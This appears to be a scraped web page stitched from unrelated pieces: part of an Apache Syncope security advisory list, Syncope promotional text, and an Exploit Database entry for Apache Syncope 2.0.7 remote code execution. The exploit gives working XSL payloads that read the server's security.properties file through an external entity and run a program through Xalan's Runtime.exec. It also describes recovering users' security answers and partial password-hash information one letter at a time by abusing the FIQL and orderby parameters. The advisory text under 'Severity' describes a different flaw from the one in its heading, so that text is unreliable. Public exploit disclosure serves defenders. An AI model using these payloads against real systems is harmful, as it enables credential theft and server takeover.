# Security Advisories

This page lists all security vulnerabilities fixed in released versions of Apache Syncope.

Please note that binary patches are never provided. If you need to apply a source code patch, use the
[building instructions](building.html) or
[re-generate your Maven project](docs/getting-started.html#create-project) from published archetype.

If you want to report a vulnerability, please follow [the procedure](https://www.apache.org/security/).

## CVE-2024-45031: Apache Syncope: Stored XSS in Console and Enduser

When editing objects in the Syncope Console, incomplete HTML tags could be used to bypass HTML sanitization. This made it possible to inject stored XSS payloads which would trigger for other users during ordinary usage of the application.

XSS payloads could also be injected in Syncope Enduser when editing “Personal Information” or “User Requests”: such payloads would trigger for administrators in Syncope Console, thus enabling session hijacking.

**Severity**

A Server-Side Template Injection was identified in Syncope enabling attackers to inject arbitrary Java EL
expressions, leading to an unauthenticated Remote Code Execution (RCE) vulnerability.
Apache Syncope uses Java Bean Validation (JSR 380) custom constraint validators. When building custom
constraint violation error messages, they support different types of interpolation, including Java EL
expressions.
Therefore, if an attacker can inject arbitrary data in the error message template being passed, they will be
able to run arbitrary Java code.

Apache Syncope
is an Open Source system for managing digital identities in enterprise environments,
implemented in Java EE technology and released under Apache 2.0 license.

Often, Identity Management and
Access Management are jointly referred, mainly because their two
management worlds likely coexist in the same project or in the same environment.

The two topics are however completely different: each one has its own context, its own rules, its own best
practices.

On the other hand, some products provide unorthodox implementations so it is indeed possible to do the same
thing with both of them.

[I want to build my IAM with
Apache Syncope](downloads)

[I want to contribute to
Apache Syncope](contributing)

Identity Management

Tools and practices to keep identity data consistent and synchronized across repositories, data formats and
models.

Access Management

Systems, protocols and technologies supporting user authentication (how Users are let accessing a given
system) and authorization (which capabilities each user owns on a given system).

From the definitions above, Identity Management and Access Management can be seen as complementary: very often,
the data synchronized by the former are then used by the latter to provide its features - e.g. authentication
and authorization.

# Exploit Title: Apache Syncope 2.0.7 - Remote Code Execution
# Date: 2018-09-12
# Exploit Author: Che-Chun Kuo
# Vendor Homepage: https://syncope.apache.org/
# Software Link: http://archive.apache.org/dist/syncope/
# Version: 2.0.7
# Tested on: Windows
# Advisory: https://syncope.apache.org/security
# CVE: CVE-2018-1321, CVE-2018-1322

# Vulnerability 1: Remote code execution by users with report and template privileges
# Description: A user with access to the Reports and Templates functionality can use XSL Transformations (XSLT)
# to perform malicious operations, including but not limited to file read, file write, and code execution.

# Apache Syncope uses XSLT to export report data into various formats. An attacker can perform malicious
# operations by crafting a XSL template, binding the template to a report, executing, then exporting the report.
# The following XSL can be used to read the Syncope security.properties file or execute the Windows
# calc program, respectively.

READ security.properties file
-------------------------------------------
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xsl:stylesheet [<!ENTITY file SYSTEM "..\webapps\syncope\WEB-INF\classes\security.properties">]>
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">&file;</xsl:template>
</xsl:stylesheet>

EXECUTE Windows calc program
-------------------------------------------
<xsl:stylesheet version="1.0"
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime"
	xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process">
    <xsl:variable name="rtobject" select="runtime:getRuntime()"/>
    <xsl:variable name="process" select="runtime:exec($rtobject,'calc')"/>
    <xsl:variable name="waiting" select="process:waitFor($process)"/>
    <xsl:value-of select="$process"/>
</xsl:stylesheet>

# Vulnerability 2: Information disclosure via FIQL and ORDER BY sorting
# Description: A user with entitlements to the /syncope/rest/users endpoint can recover sensitive
# security values using the fiql and orderby parameters.

# By default, Apache Syncope prevents sensitive values from being returned when querying
# the /syncope/rest/users endpoint. Fields such as securityAnswers or password will always return null.
# However the results returned can be filtered or sorted based on sensitive fields. By measuring how
# the results are returned the values of the desired fields can be successfully recovered. The fiql parameter
# can be used to recover full security answers, and the orderby parameter can be used to recover
# full security answers and partial information about password hashes.

# The fiql parameter allows filtering based on user attributes, including a user's security answer.
# By using FIQL filters (i.e. "securityAnswer==a*", "securityAnswer==b*", etc...) a user's
# securityAnswer can be recovered one letter at a time.

# The orderby parameter allows sorting based on user attributes, including a user's security
# answer and password. The following example shows how orderby sorting can be exploited.

# User Bob exists with the security answer "test". A malicious user creates a user Alice with the
# security answer "ta". The malicious actor then calls the /syncope/rest/users endpoint with orderby=securityAnswer".
# By sorting using the "securityAnswer" attribute, the result will have Alice sorted ahead of Bob,
# due to the value "ta" being before the value "test". By sequentially changing Alice's security
# question and comparing the sorted result, Bob's security answer can be recovered one letter
# at a time. A similar technique can be used to reveal partial information about user password hashes.

Orderby Example Results:
Alice's security answer, Order of results returned
ta, [Alice, Bob]
tb, [Alice, Bob]
tc, [Alice, Bob]
td, [Alice, Bob]
te, [Alice, Bob]
tf, [Bob, Alice]
tea, [Alice, Bob]
teb, [Alice, Bob]

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
